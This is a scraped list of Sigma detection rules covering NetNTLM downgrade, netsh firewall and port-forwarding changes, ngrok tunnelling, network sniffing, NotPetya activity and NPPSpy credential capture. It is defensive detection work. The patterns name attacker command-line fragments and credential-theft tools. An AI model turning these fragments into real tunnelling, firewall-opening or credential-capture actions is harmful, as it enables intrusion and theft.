<li><a href="#">title:NetNTLM Downgrade Attack id: d67572a0-e2ec-45d6-b8db-c100d14b8ef2 description: Detects NetNTLM downgrade attack status: experimental references: - author: Florian Roth, wagga date: 2018/03/20 modified: 2021/09/21 tags: - attack.defense_evasion - attack.t1562.001 - attack.t1112 logsource: product: windows category: registry_event detection: selection: TargetObject|contains|all: - 'SYSTEM\' - 'ControlSet' - '\Control\Lsa' TargetObject|endswith: - '\lmcompatibilitylevel' - '\NtlmMinClientSec' - '\RestrictSendingNTLMTraffic' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Netsh Allow Group Policy on Microsoft Defender Firewall id: 347906f3-e207-4d18-ae5b-a9403d6bcdef status: experimental description: Adversaries may modify system firewalls in order to bypass controls limiting network usage author: frack113 references: - - date: 2022/01/09 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\netsh.exe' CommandLine|contains|all: - advfirewall - firewall - set - rule - 'group=' - new - 'enable=Yes' condition: selection falsepositives: - Legitimate administration level: medium tags: - attack.defense_evasion - attack.t1562.004 
<li><a href="#">title:Netsh Port Forwarding id: 322ed9ec-fcab-4f67-9a34-e7c6aef43614 description: Detects netsh commands that configure a port forwarding (PortProxy) references: - - - date: 2019/01/29 modified: 2021/06/22 tags: - attack.lateral_movement - attack.defense_evasion - attack.command_and_control - attack.t1090 status: experimental author: Florian Roth, omkar72, oscd.community logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\netsh.exe' CommandLine|contains|all: - 'interface' - 'portproxy' - 'add' - 'v4tov4' selection2: Image|endswith: '\netsh.exe' CommandLine|contains|all: - 'connectp' - 'listena' - 'c=' condition: selection1 or selection2 falsepositives: - Legitimate administration - WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. ) level: medium 
<li><a href="#">title:Netsh Port or Application Allowed id: cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c status: test description: Allow Incoming Connections by Port or Application on Windows Firewall author: Markus Neis, Sander Wiebing references: - (Lazarus HARDRAIN) - date: 2019/01/29 modified: 2022/02/10 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\netsh.exe' selection2: CommandLine|contains|all: - 'firewall' - 'add' filter_dropbox: CommandLine|contains: - '\netsh.exe advfirewall firewall add rule name=Dropbox dir=in action=allow "program=C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" enable=yes profile=Any' - '\netsh.exe advfirewall firewall add rule name=Dropbox dir=in action=allow "program=C:\Program Files\Dropbox\Client\Dropbox.exe" enable=yes profile=Any' condition: selection1 and selection2 and not 1 of filter_* falsepositives: - Legitimate administration level: medium tags: - attack.defense_evasion - attack.t1562.004 
<li><a href="#">title:Netsh Program Allowed with Suspcious Location id: a35f5a72-f347-4e36-8895-9869b0d5fc6d status: test description: Detects Netsh commands that allows a suspcious application location on Windows Firewall author: Sander Wiebing, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community references: - - date: 2020/05/25 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\netsh.exe' CommandLine|contains|all: - 'firewall' - 'add' - 'allowedprogram' selection2: Image|endswith: '\netsh.exe' CommandLine|contains|all: - 'advfirewall' - 'firewall' - 'add' - 'rule' - 'action=allow' - 'program=' susp_image: - CommandLine|contains: - '%TEMP%' - ':\RECYCLER\' - 'C:\$Recycle.bin\' - ':\SystemVolumeInformation\' - 'C:\Windows\Temp\' - 'C:\Temp\' - 'C:\Users\Public\' - 'C:\Users\Default\' - 'C:\Users\Desktop\' - '\Downloads\' - '\Temporary Internet Files\Content.Outlook\' - '\Local Settings\Temporary Internet Files\' - CommandLine|startswith: - 'C:\Windows\Tasks\' - 'C:\Windows\debug\' - 'C:\Windows\fonts\' - 'C:\Windows\help\' - 'C:\Windows\drivers\' - 'C:\Windows\addins\' - 'C:\Windows\cursors\' - 'C:\Windows\system32\tasks\' - '%Public%\' condition: (selection1 or selection2) and susp_image falsepositives: - Legitimate administration level: high tags: - attack.defense_evasion - attack.t1562.004 
<li><a href="#">title:Netsh RDP Port Forwarding id: 782d6f3e-4c5d-4b8c-92a3-1d05fed72e63 status: test description: Detects netsh commands that configure a port forwarding of port 3389 used for RDP author: Florian Roth, oscd.community references: - date: 2019/01/29 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\netsh.exe' CommandLine|contains|all: - 'i' - ' p' - '=3389' - ' c' condition: selection falsepositives: - Legitimate administration level: high tags: - attack.lateral_movement - attack.defense_evasion - attack.command_and_control - attack.t1090 
<li><a href="#">title:Netsh RDP Port Opening id: 01aeb693-138d-49d2-9403-c4f52d7d3d62 status: test description: Detects netsh commands that opens the port 3389 used for RDP, used in Sarwent Malware author: Sander Wiebing references: - date: 2020/05/23 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - netsh - firewall add portopening - tcp 3389 selection2: CommandLine|contains|all: - netsh - advfirewall firewall add rule - action=allow - protocol=TCP - localport=3389 condition: 1 of selection* falsepositives: - Legitimate administration level: high tags: - attack.defense_evasion - attack.t1562.004 
<li><a href="#">title:NetWire RAT Registry Key id: 1d218616-71b0-4c40-855b-9dbe75510f7f description: Attempts to detect registry events for common NetWire key HKCU\Software\NetWire Note: You likely will have to change the sysmon configuration file. Per SwiftOnSecurity "Because Sysmon runs as a service, it has no filtering ability for, or concept of, HKCU or HKEY_CURRENT_USER. Use "contains" or "end with" to get around this limitation" Therefore I set <TargetObject condition="contains">netwire</TargetObjecct> in my configuration. status: experimental references: - - - - - date: 2021/10/07 modified: 2022/06/26 author: Christopher Peacock level: high logsource: product: windows category: registry_add detection: selection: EventType: CreateKey TargetObject|contains: '\software\NetWire' condition: selection falsepositives: - Unknown tags: - attack.defense_evasion - attack.t1112 #The configuration information is usually stored under HKCU:\Software\Netwire - RedCanary 
<li><a href="#">title:Network Reconnaissance Activity id: e6313acd-208c-44fc-a0ff-db85d572e90e status: experimental description: Detects a set of suspicious network related commands often used in recon stages author: Florian Roth references: - date: 2022/02/07 logsource: category: process_creation product: windows detection: selection_nslookup: CommandLine|contains|all: - 'nslookup' - '_ldap._tcp.dc._msdcs.' condition: 1 of selection* falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.discovery - attack.t1087 - attack.t1082 - car.2016-03-001 
<li><a href="#">title:Network Scans Count By Destination IP id: 4601eaec-6b45-4052-ad32-2d96d26ce0d8 status: test description: Detects many failed connection attempts to different ports or hosts author: Thomas Patzke date: 2017/02/19 modified: 2021/11/27 logsource: category: firewall detection: selection: action: denied timeframe: 24h condition: selection fields: - src_ip - dst_ip - dst_port falsepositives: - Inventarization systems - Vulnerability scans level: medium tags: - attack.discovery - attack.t1046 
<li><a href="#">title:Network Scans Count By Destination Port id: fab0ddf0-b8a9-4d70-91ce-a20547209afb status: experimental description: Detects many failed connection attempts to different ports or hosts author: Thomas Patzke date: 2017/02/19 modified: 2021/09/21 logsource: category: firewall tags: - attack.discovery - attack.t1046 detection: selection: action: denied timeframe: 24h condition: selection falsepositives: - Inventarization systems - Vulnerability scans level: medium fields: - src_ip - dst_ip - dst_port 
<li><a href="#">title:Network Sniffing id: adc9bcc4-c39c-4f6b-a711-1884017bf043 status: test description: Detects the usage of tooling to sniff network traffic. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/14 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: - '/tcpdump' - '/tshark' condition: selection falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.credential_access - attack.t1040 
<li><a href="#">title:Network Sniffing id: ba1f7802-adc7-48b4-9ecb-81e227fddfd5 status: test description: Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\tshark.exe' CommandLine|contains: '-i' - Image|endswith: '\windump.exe' condition: selection fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine falsepositives: - Admin activity level: low tags: - attack.credential_access - attack.discovery - attack.t1040 
<li><a href="#">title:Network Sniffing id: f4d3748a-65d1-4806-bd23-e25728081d01 status: test description: Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection1: type: 'execve' a0: 'tcpdump' a1: '-c' a3|contains: '-i' selection2: type: 'execve' a0: 'tshark' a1: '-c' a3: '-i' condition: selection1 or selection2 falsepositives: - Legitimate administrator or user uses network sniffing tool for legitimate reasons. level: low tags: - attack.credential_access - attack.discovery - attack.t1040 
<li><a href="#">title:New Application in AppCompat id: 60936b49-fca0-4f32-993d-7415edcf9a5d status: test description: A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/05/02 modified: 2022/06/26 logsource: product: windows category: registry_set detection: selection: EventType: Setvalue TargetObject|contains: '\AppCompatFlags\Compatibility Assistant\Store\' condition: selection falsepositives: - This rule is to explore new applications on an endpoint. False positives depends on the organization. - Newly setup system. - Legitimate installation of new application. level: informational tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:New DLL Added to AppCertDlls Registry Key id: 6aa1d992-5925-4e9f-a49b-845e51d1de01 status: test description: Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. author: Ilyas Ochkov, oscd.community references: - - date: 2019/10/25 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: # Sysmon gives us HKLM\SYSTEM\CurrentControlSet\.. if ControlSetXX is the selected one - TargetObject: 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls' # key rename - NewName: 'HKLM\SYSTEM\CurentControlSet\Control\Session Manager\AppCertDlls' condition: selection fields: - EventID - Image - TargetObject - NewName falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1546.009 
<li><a href="#">title:New DLL Added to AppInit_DLLs Registry Key id: 4f84b697-c9ed-4420-8ab5-e09af5b2345d status: experimental description: DLLs that are specified in the AppInit_DLLs value in the Registry key HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll references: - author: Ilyas Ochkov, oscd.community, Tim Shelton date: 2019/10/25 modified: 2021/11/11 logsource: category: registry_event product: windows detection: selection: - TargetObject|endswith: - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_Dlls' - '\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_Dlls' #key rename - NewName|endswith: - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_Dlls' - '\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_Dlls' filter: Details: '(Empty)' condition: selection and not filter fields: - EventID - Image - TargetObject - NewName falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1546.010 
<li><a href="#">title:New Federated Domain Added id: 42127bdd-9133-474f-a6f1-97b6c08a4339 status: experimental description: Alert for the addition of a new federated domain. author: '@ionsor' date: 2022/02/08 references: - - - - - logsource: service: exchange product: m365 detection: selection: eventSource: Exchange eventName: 'Add-FederatedDomain' status: success condition: selection falsepositives: - The creation of a new Federated domain is not necessarily malicious, however these events need to be followed closely, as it may indicate federated credential abuse or backdoor via federated identities at a similar or different cloud provider. level: medium tags: - attack.persistence - attack.t1136.003 
<li><a href="#">title:New File Association Using Exefile id: 44a22d59-b175-4f13-8c16-cbaef5b581ff description: Detects the abuse of the exefile handler in new file association. Used for bypass of security products. author: Andreas Hunkeler (@Karneades) date: 2021/11/19 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: TargetObject|contains: 'Classes\.' Details: 'exefile' EventType: SetValue condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion 
<li><a href="#">title:New Kind of Network (NKN) Detection id: fa7703d6-0ee8-4949-889c-48c84bc15b6f status: experimental description: NKN is a networking service using blockchain technology to support a decentralized network of peers. While there are legitimate uses for it, it can also be used as a C2 channel. This rule looks for a DNS request to the ma> references: - - - tags: - attack.command_and_control author: Michael Portera (@mportatoes) date: 2022/04/21 logsource: product: zeek service: dns detection: selection: query|contains|all: - 'seed' - '.nkn.org' condition: selection fields: - id.orig_h - id.resp_h - answers falsepositives: - Unknown level: low 
<li><a href="#">title:New Lolbin Process by Office Applications id: 23daeb52-e6eb-493c-8607-c4f0246cb7d8 description: This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated. references: - - - (aka_REvil)_Ransomware.yaml author: 'Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)' tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2022/06/27 logsource: product: windows category: process_creation detection: #useful_information: add more LOLBins to the rules logic of your choice. selection: Image|endswith: - '\regsvr32.exe' - '\rundll32.exe' - '\msiexec.exe' - '\mshta.exe' - '\verclsid.exe' - '\msdt.exe' ParentImage|endswith: - '\winword.exe' - '\excel.exe' - '\powerpnt.exe' - '\msaccess.exe' - '\mspub.exe' - '\eqnedt32.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:New or Renamed User Account with '$' in Attribute 'SamAccountName' id: cfeed607-6aa4-4bbd-9627-b637deb723c8 status: experimental description: Detects possible bypass EDR and SIEM via abnormal user account name. tags: - attack.defense_evasion - attack.t1036 author: Ilyas Ochkov, oscd.community date: 2019/10/25 modified: 2021/07/07 logsource: product: windows service: security detection: selection: EventID: - 4720 # create user - 4781 # rename user SamAccountName|contains: '$' condition: selection fields: - EventID - SamAccountName - SubjectUserName falsepositives: - Unknown level: high 
<li><a href="#">title:New Root or CA or AuthRoot Certificate to Store id: d223b46b-5621-4037-88fe-fda32eead684 description: Detects the addition of new root, CA or AuthRoot certificates to the Windows registry author: frack113 date: 2022/04/04 modified: 2022/06/26 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject|contains: - '\SOFTWARE\Microsoft\SystemCertificates\Root\Certificates\' - '\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates\' - '\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\' - '\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates\' - '\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates\' - '\SOFTWARE\Microsoft\EnterpriseCertificates\CA\Certificates\' - '\Software\Microsoft\SystemCertificates\AuthRoot\Certificates\' - '\SOFTWARE\Policies\Microsoft\SystemCertificates\AuthRoot\Certificates\' - '\SOFTWARE\Microsoft\EnterpriseCertificates\AuthRoot\Certificates\' TargetObject|endswith: '\Blob' Details: 'Binary Data' condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1490 
<li><a href="#">title:New RUN Key Pointing to Suspicious Folder id: 02ee49e2-e294-4d0f-9278-f5b3212fc588 status: experimental description: Detects suspicious new RUN key element pointing to an executable in a suspicious folder references: - author: Florian Roth, Markus Neis, Sander Wiebing date: 2018/08/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: - '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' - '\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\' selection2: - Details|contains: - 'C:\Windows\Temp\' - 'C:\$Recycle.bin\' - 'C:\Temp\' - 'C:\Users\Public\' - 'C:\Users\Default\' - 'C:\Users\Desktop\' - '\AppData\Local\Temp\' - Details|startswith: - '%Public%\' - 'wscript' - 'cscript' condition: selection and selection2 fields: - Image falsepositives: - Software using weird folders for updates level: high tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:New Service Creation id: 7fe71fc9-de3b-432a-8d57-8c809efc10ab status: test description: Detects creation of a new service. author: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\sc.exe' CommandLine|contains|all: - 'create' - 'binpath' - Image|endswith: '\powershell.exe' CommandLine|contains: 'new-service' condition: selection falsepositives: - Legitimate administrator or user creates a service for legitimate reasons. level: low tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 
<li><a href="#">title:New Service Uses Double Ampersand in Path id: ca83e9f3-657a-45d0-88d6-c1ac280caf53 description: Detects a service installation that uses a suspicious double ampersand used in the image path value status: experimental author: Florian Roth date: 2022/07/05 references: - Internal Research tags: - attack.defense_evasion - attack.t1027 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains: '&&' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:New Shim Database Created in the Default Directory id: ee63c85c-6d51-4d12-ad09-04e25877a947 status: experimental description: | Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. author: frack113 references: - date: 2021/12/29 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '.sdb' TargetFilename|contains: '\Windows\apppatch\Custom\' condition: selection falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1547.009 
<li><a href="#">title:Nginx Core Dump id: 59ec40bb-322e-40ab-808d-84fa690d7e56 description: Detects a core dump of a crashing Nginx worker process, which could be a signal of a serious problem or exploitation attempts. status: experimental author: Florian Roth date: 2021/05/31 references: - - logsource: service: apache detection: keywords: - 'exited on signal 6 (core dumped)' condition: keywords falsepositives: - Serious issues with a configuration or plugin level: high tags: - attack.impact - attack.t1499.004 
<li><a href="#">title:Ngrok Usage id: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31 description: Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available. Involved domains are bin.equinox.io for download and *.ngrok.io for connections. status: experimental references: - - - - - . author: Florian Roth date: 2021/05/14 modified: 2021/06/07 tags: - attack.command_and_control - attack.t1572 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - ' tcp 139' - ' tcp 445' - ' tcp 3389' - ' tcp 5985' - ' tcp 5986' selection2: CommandLine|contains|all: - ' start ' - '--all' - '--config' - '.yml' selection3: Image|endswith: 'ngrok.exe' CommandLine|contains: - ' tcp ' - ' http ' - ' authtoken ' condition: 1 of selection* falsepositives: - Another tool that uses the command line switches of Ngrok - Ngrok http 3978 () level: high 
<li><a href="#">title:Ngrok Usage with Remote Desktop Service id: 64d51a51-32a6-49f0-9f3d-17e34d640272 description: Detects cases in which ngrok, a reverse proxy tool, forwards events to the local RDP port, which could be a sign of malicious behaviour author: Florian Roth status: experimental references: - - date: 2022/04/29 tags: - attack.command_and_control - attack.t1090 logsource: product: windows service: terminalservices-localsessionmanager detection: selection: EventID: 21 Address|contains: '16777216' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Nimbuspwn Exploitation id: 7ba05b43-adad-4c02-b5e9-c8c35cdf9fa8 status: experimental description: Detects exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800) author: Bhabesh Raj references: - - date: 2022/05/04 logsource: product: linux detection: keyword: - 'networkd-dispatcher' - 'Error handling notification for interface' - '../../' condition: all of keyword falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1068 
<li><a href="#">title:NirCmd Tool Execution As LOCAL SYSTEM id: d9047477-0359-48c9-b8c7-792cedcdc9c4 status: experimental description: Detects the use of NirCmd tool for command execution as SYSTEM user author: 'Florian Roth, Nasreddine Bencherchali @nas_bench' date: 2022/01/24 references: - - - tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: ' runassystem ' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: high 
<li><a href="#">title:NirCmd Tool Execution id: 4e2ed651-1906-4a59-a78a-18220fca1b22 status: experimental description: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity author: 'Florian Roth, Nasreddine Bencherchali @nas_bench' date: 2022/01/24 modified: 2022/05/13 references: - - - tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection_org: OriginalFileName: 'NirCmd.exe' combo_exec: CommandLine|contains: - ' exec ' - ' exec2 ' combo_exec_params: CommandLine|contains: - ' show ' - ' hide ' selection_cmd: CommandLine|contains: - ' execmd ' - '.exe script ' - '.exe shexec ' - ' runinteractive ' condition: 1 of selection* or (combo_exec and combo_exec_params) fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: medium 
<li><a href="#">title:Node Process Executions id: df1f26d3-bea7-4700-9ea2-ad3e990cf90e status: experimental description: Detects the execution of other scripts using the Node executable packaged with Adobe Creative Cloud references: - author: Max Altgelt date: 2022/04/06 tags: - attack.defense_evasion - attack.t1127 - attack.t1059.007 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\Adobe Creative Cloud Experience\libs\node.exe' filter: CommandLine|contains: 'Adobe Creative Cloud Experience\js' # Folder where Creative Cloud's JS resources are located condition: selection and not filter fields: - Image - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:NodejsTools PressAnyKey Lolbin id: a20391f8-76fb-437b-abc0-dba2df1952c6 status: experimental description: Detects a certain command line flag combination used by Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary references: - tags: - attack.execution - attack.defense_evasion - attack.t1218 author: Florian Roth date: 2022/01/11 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: 'Microsoft.NodejsTools.PressAnyKey.exe normal ' selection2: CommandLine|contains: '.exe normal ' CommandLine|endswith: '.exe' filter: Image|contains: '\Microsoft\NodeJsTools\NodeJsTools' condition: 1 of selection* and not 1 of filter* falsepositives: - Other tools with the same command line flag combination - Legitimate uses as part of Visual Studio development level: high 
<li><a href="#">title:Nohup Execution id: e4ffe466-6ff8-48d4-94bd-e32d1a6061e2 status: experimental description: Detects usage of nohup which could be leveraged by an attacker to keep a process running or break out from restricted environments author: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io' references: - - - date: 2022/06/06 logsource: product: linux category: process_creation detection: selection: Image|endswith: '/nohup' condition: selection falsepositives: - Administrators or installed processes that leverage nohup level: medium 
<li><a href="#">title:Non Interactive PowerShell id: f4bbd493-b796-416e-bbf2-121235348529 description: Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent. status: experimental date: 2019/09/12 modified: 2021/05/10 author: Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements) references: - tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' filter: ParentImage|endswith: - '\explorer.exe' - '\CompatTelRunner.exe' condition: selection and not filter falsepositives: - Legitimate programs executing PowerShell scripts level: low 
<li><a href="#">title:Non-privileged Usage of Reg or Powershell id: 8f02c935-effe-45b3-8fc9-ef8696a9e41d status: test description: Search for usage of reg or Powershell by non-priveleged users to modify service configuration in registry author: Teymur Kheirkhabarov (idea), Ryan Plas (rule), oscd.community references: - date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: integrity_level: IntegrityLevel: 'Medium' reg: CommandLine|contains|all: - 'reg' - 'add' powershell_1: CommandLine|contains: 'powershell' powershell_2: CommandLine|contains: - 'set-itemproperty' - ' sp ' - 'new-itemproperty' registry_folder: CommandLine|contains|all: - 'ControlSet' - 'Services' registry_key: CommandLine|contains: - 'ImagePath' - 'FailureCommand' - 'ServiceDLL' condition: integrity_level and (reg or powershell_1 and powershell_2) and registry_folder and registry_key fields: - EventID - IntegrityLevel - CommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Notepad Making Network Connection id: e81528db-fc02-45e8-8e98-4e84aba1f10b status: test description: Detects suspicious network connection by Notepad author: EagleEye Team references: - - date: 2020/05/14 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\notepad.exe' filter: DestinationPort: '9100' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.execution - attack.defense_evasion - attack.t1055 
<li><a href="#">title:NotPetya Ransomware Activity id: 79aeeb41-8156-4fac-a0cd-076495ab82a1 status: test description: Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil author: Florian Roth, Tom Ueltschi references: - - date: 2019/01/16 modified: 2022/03/05 logsource: category: process_creation product: windows detection: select_pipe_com: CommandLine|contains|all: - '\AppData\Local\Temp\' - '\\\\.\\pipe\\' select_rundll32_dash1: Image|endswith: '\rundll32.exe' CommandLine|endswith: - '.dat,#1' - '.dat #1' # Sysmon removes comma select_perfc_keyword: - '\perfc.dat' condition: 1 of select* fields: - CommandLine - ParentCommandLine falsepositives: - Admin activity level: critical tags: - attack.defense_evasion - attack.t1218.011 - attack.t1070.001 - attack.credential_access - attack.t1003.001 - car.2016-04-002 
<li><a href="#">title:NPPSpy Hacktool Usage id: cad1fe90-2406-44dc-bd03-59d0b58fe722 status: experimental description: Detects the use of NPPSpy hacktool that stores cleartext passwords of users that logged in to a local file author: Florian Roth references: - - date: 2021/11/29 tags: - attack.credential_access logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: - '\NPPSpy.txt' - '\NPPSpy.dll' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:NSudo Tool Execution id: 771d1eb5-9587-4568-95fb-9ec44153a012 status: experimental description: Detects the use of NSudo tool for command execution author: Florian Roth, Nasreddine Bencherchali date: 2022/01/24 modified: 2022/06/07 references: - - tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: - '\NSudo.exe' - '\NSudoLC.exe' - '\NSudoLG.exe' - OriginalFileName: - 'NSudo.exe' - 'NSudoLC.exe' - 'NSudoLG.exe' selection_cli: CommandLine|contains: # Covers Single/Double dash "-"/"--" + ":" - '-U:S ' # System - '-U:T ' # Trusted Installer - '-U:E ' # Elevated - '-P:E ' # Enable All Privileges - '-M:S ' # System Integrity - '-M:H ' # High Integrity # Covers Single/Double dash "-"/"--" + "=" - '-U=S ' - '-U=T ' - '-U=E ' - '-P=E ' - '-M=S ' - '-M=H ' condition: all of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: high 
<li><a href="#">title:NTFS Alternate Data Stream id: 8c521530-5169-495d-a199-0a3a881ad24e status: experimental description: Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging. references: - - tags: - attack.defense_evasion - attack.t1564.004 - attack.execution - attack.t1059.001 author: Sami Ruohonen date: 2018/07/24 modified: 2021/12/02 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_content: ScriptBlockText|contains: - set-content - add-content selection_stream: ScriptBlockText|contains: '-stream' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:NTFS Vulnerability Exploitation id: f14719ce-d3ab-4e25-9ce6-2899092260b0 description: This the exploitation of a NTFS vulnerability as reported without many details via Twitter status: experimental author: Florian Roth date: 2021/01/11 modified: 2021/11/17 references: - - - logsource: product: windows service: system detection: selection: Provider_Name: Ntfs EventID: 55 Origin: 'File System Driver' Description|contains|all: - 'contains a corrupted file record' - 'The name of the file is "\"' condition: selection falsepositives: - Unlikely level: high tags: - attack.impact - attack.t1499.001 
<li><a href="#">title:NTLM Brute Force id: 9c8acf1a-cbf9-4db6-b63c-74baabe03e59 status: experimental description: Detects common NTLM brute force device names references: - author: Jerry Shockley '@jsh0x' date: 2022/02/02 tags: - attack.credential_access - attack.t1110 logsource: product: windows service: ntlm definition: Requires events from Microsoft-Windows-NTLM/Operational detection: selection: EventID: 8004 devicename: WorkstationName: - 'Rdesktop' - 'Remmina' - 'Freerdp' - 'Windows7' - 'Windows8' - 'Windows2012' - 'Windows2016' - 'Windows2019' condition: selection and devicename falsepositives: - Systems with names equal to the spoofed ones used by the brute force tools level: medium 
<li><a href="#">title:NTLM Logon id: 98c3bcf1-56f2-49dc-9d8d-c66cf190238b status: experimental description: Detects logons using NTLM, which could be caused by a legacy source or attackers references: - - author: Florian Roth date: 2018/06/08 modified: 2021/11/20 tags: - attack.lateral_movement - attack.t1550.002 logsource: product: windows service: ntlm definition: Requires events from Microsoft-Windows-NTLM/Operational detection: selection: EventID: 8002 ProcessName: '*' # We use this to avoid false positives with ID 8002 on other log sources if the logsource isn't set correctly condition: selection falsepositives: - Legacy hosts level: low 
<li><a href="#">title:NTLMv1 Logon Between Client and Server id: e9d4ab66-a532-4ef7-a502-66a9e4a34f5d status: experimental description: Detects the reporting of NTLMv1 being used between a client and server author: Tim Shelton date: 2022/04/26 modified: 2022/05/02 references: - tags: - attack.execution - attack.t1550.002 - attack.s0363 fields: - EventID - Provider_Name logsource: product: windows service: system detection: selection: Provider_Name: "LsaSrv" EventID: 6038 condition: selection falsepositives: - Environments that use NTLMv1 level: low 
